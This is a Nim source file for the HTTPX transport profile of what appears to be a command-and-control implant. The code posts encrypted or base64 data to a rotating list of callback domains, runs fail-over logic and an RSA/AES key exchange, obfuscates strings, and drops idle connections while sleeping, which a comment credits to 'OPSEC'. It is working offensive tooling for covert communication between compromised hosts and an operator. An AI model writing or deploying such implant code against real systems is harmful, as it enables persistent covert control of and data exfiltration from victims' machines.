import std/[base64, strutils, json, random, os]
import ../config
import ../utils/crypto
import ../utils/httpx_client  # Also exports HttpClientWrapper from http_client
import ../utils/debug
import ../utils/strenc

const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]
when encryptedExchange:
  import ../utils/key_exchange

type
  HttpxProfile* = ref object
    config: Config
    aesKey: seq[byte]
    aesDecKey: seq[byte]  # Separate key for decryption
    rawC2Config: JsonNode
    callbackDomains: seq[string]
    domainRotation: string
    failoverThreshold: int
    currentDomainIndex: int
    httpClient: HttpClientWrapper  # Persistent HTTP client to prevent resource exhaustion

proc newHttpxProfile*(): HttpxProfile =
  ## Create a new HTTPX profile with raw_c2_config support
  result = HttpxProfile()
  result.config = getConfig()
  result.currentDomainIndex = 0
  
  # Parse callback_domains from JSON array
  let domainsStr = result.config.callbackDomains
  if domainsStr.len == 0:
    raise newException(ValueError, obf("CALLBACK_DOMAINS environment variable is not set"))
  try:
    let domainsJson = parseJson(domainsStr)
    result.callbackDomains = @[]
    for domain in domainsJson:
      result.callbackDomains.add(domain.getStr())
  except:
    raise newException(ValueError, obf("Failed to parse CALLBACK_DOMAINS"))

  # Get domain rotation strategy
  let domainRotationStr = result.config.domainRotation
  if domainRotationStr.len == 0:
    raise newException(ValueError, obf("DOMAIN_ROTATION environment variable is not set"))
  result.domainRotation = domainRotationStr

  # Get failover threshold
  result.failoverThreshold = result.config.failoverThreshold
  if result.failoverThreshold == 0:
    raise newException(ValueError, obf("FAILOVER_THRESHOLD is not set or invalid"))
  
  # Parse raw_c2_config
  let rawConfigStr = result.config.rawC2Config
  if rawConfigStr.len > 0:
    try:
      result.rawC2Config = parseJson(rawConfigStr)
    except:
      result.rawC2Config = newJNull()
  else:
    result.rawC2Config = newJNull()
  
  # Create persistent HTTP client (reused across all requests)
  result.httpClient = newClientWrapper()
  
  debugLog "httpx", "HTTPX Profile initialized"
  debugLog "httpx", "Callback domains: ", result.callbackDomains.join(", ")
  debugLog "httpx", "Domain rotation: ", result.domainRotation
  debugLog "httpx", "Failover threshold: ", result.failoverThreshold

proc selectDomain(profile: var HttpxProfile): string =
  ## Select domain based on rotation strategy
  case profile.domainRotation
  of obf("random"):
    randomize()
    result = profile.callbackDomains[rand(profile.callbackDomains.len - 1)]
  of obf("round-robin"):
    result = profile.callbackDomains[profile.currentDomainIndex]
    profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.callbackDomains.len
  else: # fail-over
    result = profile.callbackDomains[profile.currentDomainIndex]

proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): string =
  ## Send data to C2 server using raw_c2_config with transforms
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
  
  debugLog "httpx", "=== SENDING DATA VIA HTTPX ==="
  try:
    let jsonData = parseJson(data)
    if data.len < 2048:
      debugLog "httpx", "Request JSON:"
      debug jsonData.pretty()
    else:
      debugLog "httpx", "Request: Large payload (", data.len, " bytes)"
      if jsonData.hasKey(obf("action")):
        debugLog "httpx", "Action: ", jsonData["action"].getStr()
  except:
    debugLog "httpx", "Request data (first 500 chars): ", data[0..<min(500, data.len)]
  
  # Encrypt or encode payload
  var payload: string
  if profile.aesKey.len > 0 and callbackUuid.len > 0:
    debugLog "httpx", "Encrypting payload with AES-256-CBC+HMAC"
    payload = encryptPayload(data, profile.aesKey, uuid)
  else:
    debugLog "httpx", "Sending unencrypted payload (Base64 only)"
    payload = encode(uuid & data)
  
  # Use raw_c2_config if available
  if not profile.rawC2Config.isNil and profile.rawC2Config.kind != JNull:
    debugLog "httpx", "Using raw_c2_config for HTTPX profile"
    # Get POST endpoint configuration
    if not profile.rawC2Config.hasKey("post"):
      debugLog "httpx", "No POST endpoint in raw_c2_config"
      return ""
    let postConfig = profile.rawC2Config["post"]
    # Select URI from list
    if not postConfig.hasKey("uris") or postConfig["uris"].len == 0:
      debugLog "httpx", "No URIs in POST endpoint"
      return ""
    randomize()
    let uri = postConfig["uris"][rand(postConfig["uris"].len - 1)].getStr()
    # Try domains based on rotation strategy
    var rawResponse: string
    case profile.domainRotation
    of obf("random"), obf("round-robin"):
      let baseUrl = profile.selectDomain()
      let fullUrl = baseUrl & uri
      try:
        rawResponse = httpxPost(fullUrl, payload, postConfig, profile.httpClient)
      except:
        debugLog "httpx", "Request failed: ", getCurrentExceptionMsg()
        return ""
    else: # fail-over
      var attempts = 0
      var checkedDomains = 0
      # Start from currentDomainIndex and wrap around
      while checkedDomains < profile.callbackDomains.len:
        let domainIdx = (profile.currentDomainIndex + checkedDomains) mod profile.callbackDomains.len
        let domain = profile.callbackDomains[domainIdx]
        let fullUrl = domain & uri
        var domainAttempts = 0
        var domainSucceeded = false
        while domainAttempts < profile.failoverThreshold:
          try:
            rawResponse = httpxPost(fullUrl, payload, postConfig, profile.httpClient)
            domainSucceeded = true
            break
          except:
            debugLog "httpx", "Attempt ", domainAttempts + 1, " failed for ", domain
            domainAttempts += 1
        if domainSucceeded and rawResponse.len > 0:
          # Success - reset to this working domain for next time
          profile.currentDomainIndex = domainIdx
          break
        elif domainSucceeded:
          # Got response but it was empty - still move to next domain
          debugLog "httpx", "Domain ", domain, " returned empty response"
        else:
          # All attempts failed for this domain - move to next
          debugLog "httpx", "Domain ", domain, " exhausted all ", profile.failoverThreshold, " attempts"
        checkedDomains += 1
        attempts += 1
      if rawResponse.len == 0:
        debugLog "httpx", "All domains failed after failover attempts"
        # Move to next domain for next attempt
        profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.callbackDomains.len
        return ""
    # Check if response is empty (e.g., from HTTP error like 502)
    if rawResponse.len == 0:
      debugLog "httpx", "Empty response received (possibly HTTP error)"
      return ""
    # Decrypt or decode response after transforms have been reversed
    if profile.aesKey.len > 0 and callbackUuid.len > 0:
      debugLog "httpx", "Decrypting response with AES-256-CBC+HMAC"
      result = decryptPayload(rawResponse, profile.aesKey)
    else:
      debugLog "httpx", "Decoding Base64 response"
      let decoded = decode(rawResponse)
      if decoded.len > 36:
        result = decoded[36..^1]
      else:
        result = ""
    return result
  
  else:
    # Fallback to simple HTTP POST (like basic HTTP profile)
    debugLog "httpx", "No raw_c2_config, using fallback POST"
    let baseUrl = profile.selectDomain()
    let fullUrl = baseUrl & "/" & profile.config.postUri
    try:
      # Use persistent client for fallback too
      profile.httpClient.headers[obf("User-Agent")] = profile.config.userAgent
      result = profile.httpClient.postContent(fullUrl, payload)
      # Decrypt or decode response
      if profile.aesKey.len > 0 and callbackUuid.len > 0:
        result = decryptPayload(result, profile.aesKey)
      else:
        let decoded = decode(result)
        if decoded.len > 36:
          result = decoded[36..^1]
        else:
          result = ""
    except:
      debugLog "httpx", "Fallback request failed: ", getCurrentExceptionMsg()
      return ""

proc setAesKey*(profile: var HttpxProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key

proc setAesDecKey*(profile: var HttpxProfile, key: seq[byte]) =
  ## Set the AES decryption key
  profile.aesDecKey = key

proc hasAesKey*(profile: HttpxProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc cleanup*(profile: var HttpxProfile) =
  ## Close HTTP client connection to avoid keeping ESTABLISHED connections during sleep
  ## Closes underlying socket connections on both Windows and Linux for better OPSEC
  debugLog "httpx", "HTTPX Profile: Cleaning up client connection"
  # Close the httpclient and its connections
  try:
    profile.httpClient.closeWrapper()
    debugLog "httpx", "HTTPX Profile: Client connection closed"
  except:
    debugLog "httpx", "HTTPX Profile: Failed to close client: ", getCurrentExceptionMsg()

proc reconnect*(profile: var HttpxProfile) =
  ## Recreate HTTP client connection after cleanup
  ## This ensures we have a fresh connection for the next request on both Windows and Linux
  ## Note: HTTPX doesn't set headers here - they're set per-request in httpxPost from raw_c2_config
  debugLog "httpx", "HTTPX Profile: Recreating client connection"
  profile.httpClient = newClientWrapper()
  debugLog "httpx", "HTTPX Profile: Client connection recreated"

proc performKeyExchange*(profile: var HttpxProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  ## Same implementation as HTTP profile
  
  if not profile.config.encryptedExchange:
    debugLog "httpx", "No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    return (true, "")
  
  when not encryptedExchange:
    debugLog "httpx", "RSA not compiled in"
    return (true, "")
  
  # Use shared key exchange implementation
  else:
    # Create a send wrapper that matches the expected signature
    var p = profile  # Create capturable local reference
    proc sendWrapper(data: string, uuid: string): string =
      return p.send(data, uuid)
    
    let exchangeResult = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
    
    if exchangeResult.success and exchangeResult.sessionKey.len > 0:
      # Set the AES key
      profile.setAesKey(exchangeResult.sessionKey)
      return (true, exchangeResult.newUuid)
    elif exchangeResult.success:
      # No key exchange needed (AESPSK mode)
      return (true, "")
    else:
      debugLog "httpx", "Key exchange failed: ", exchangeResult.error
      return (false, "")
